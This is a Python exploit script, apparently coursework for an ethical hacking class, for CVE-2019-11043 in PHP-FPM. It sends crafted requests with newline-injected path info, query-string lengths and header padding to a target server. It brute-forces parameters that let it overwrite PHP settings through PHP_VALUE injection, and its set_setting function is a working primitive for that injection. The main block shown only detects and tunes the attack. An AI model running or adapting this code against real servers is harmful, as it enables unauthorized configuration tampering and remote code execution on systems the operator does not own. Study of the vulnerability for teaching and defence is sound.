"""
CVE-2019-11043 Remote Code Execution on PHP-FPM
See https://github.com/neex/phuip-fpizdam for the original Go implementation.

Sam Lindemer 2020, FEP3370 Advanced Ethical Hacking
"""

import sys, time
from http import client
from urllib.parse import urlparse, quote

# constants
user_agent       = "Mozilla/5.0"
pos_offset       = 34
retries          = 50
min_qsl          = 1500
max_qsl          = 1950
qsl_step         = 5
max_pad_len      = 256
breaking_payload = "/KTH\nAdvancedEthicalHacking.php"
detect_enabler   = "session.auto_start=1"
detect_disabler  = "session.auto_start=0"

'''
This is a wrapper around Python's HTTP client library for automating detection
and exploitation of the vulnerability. 
'''
class Requester:

    def __init__(self, resource):
        self.url = urlparse(resource)
        self.conn = client.HTTPConnection(self.url.netloc, timeout=30)

    '''
    This method sends requests in the following format, with the number of Qs
    determined by the query string length (QSL) argument and the number of Xs
    determiend by the pad argument.

        HTTP GET /<self.url.path>/<pathinfo>?QQQQQQQQQQQQQQQ...
        User-Agent: Mozilla/5.0
        Padding: XXXXXXXXXXXXXXXXXXXXXXXX...
        More: padding
    '''
    def request(self, pathinfo, qsl, pad):

        # resource path must begin with a '/'
        if pathinfo[0] != '/': pathinfo = '/' + pathinfo

        # format the query string with newline escape characters
        path = quote(self.url.path + pathinfo, safe="=;/")

        # the length change in QSL after URL formatting must be even
        qsl_delta = len(path) - len(pathinfo) - len(quote(self.url.path, safe="=;/"))
        assert(qsl_delta % 2 == 0)

        # check that the query string length is long enough 
        qsl_prime = int(qsl - qsl_delta / 2)
        assert(qsl_prime >= 0)

        self.conn.putrequest("GET", path + '?' + 'Q' * qsl_prime, \
                skip_accept_encoding=True)
        self.conn.putheader("User-Agent", user_agent)
        self.conn.putheader("Padding", 'X' * pad)
        self.conn.putheader("Ebut", "more padding")
        self.conn.endheaders()
        return self.conn.getresponse()

def make_path_info(php_value):
    pathinfo = "/PHP_VALUE\n" + php_value
    assert(len(pathinfo) < pos_offset)
    return pathinfo + ';' * (pos_offset - len(pathinfo))

def set_setting(php_value, requester, qsl, pad):
    pathinfo = make_path_info(php_value)
    for attempt in range(retries):
        resp = requester.request(pathinfo, qsl, pad)
        resp.read()

'''
The detection step for this exploit involves sending many HTTP GET requests with
varying query string lengths appended to a path info with a linebreak in it. The
first request is used as a baseline; when a QSL incurs a different response code
than the baseline, it is stored as a candidate to be used in the exploit.
'''
def detect(requester):

    # check the baseline response code for requests in this format
    base_resp = requester.request("/path\ninfo.php", 1500, 1)
    base_resp.read()

    # find QSLs that return a different response code
    qsl_candidates = []
    for qsl in range(min_qsl, max_qsl, qsl_step):
        resp = requester.request(breaking_payload, qsl, 1)
        if resp.status != base_resp.status:
            qsl_candidates.append(qsl)
        resp.read()
    assert(len(qsl_candidates) > 0)

    # extend the list of candidates with neighboring QSLs
    qsl_extended = []
    for qsl in qsl_candidates:
        for x in range(-10, qsl_step, qsl_step):
            qsl_extended.append(qsl + x)
    print("Found query string length candidates: " + str(qsl_extended))

    # increment the amount of header padding and attempt to set a server flag
    pathinfo = make_path_info(detect_enabler)
    pad_candidates = range(max_pad_len)
    for attempt in range(retries):
        for qsl in qsl_extended:
            for pad in pad_candidates:
                resp = requester.request(pathinfo, qsl, pad)
                resp.read()

                # this check will return true if the PHP flag was modified
                if "PHPSESSID" in resp.getheader("set-cookie", default=""):
                    print("Found attack parameters: qsl=" + str(qsl) + ", pad=" + str(pad))

                    # disable the flag; it was only needed to tune the exploit
                    set_setting(detect_disabler, requester, qsl, pad) 
                    return (qsl, pad)

    # no working combination of qsl and pad found
    raise Exception("Target not vulnerable.")

if __name__ == "__main__":

    if len(sys.argv) != 2:
        print("Usage: exploit.py <address>:<port>/<resource>.php")
        exit()

    requester = Requester(sys.argv[1]) 
    qsl, pad = detect(requester)
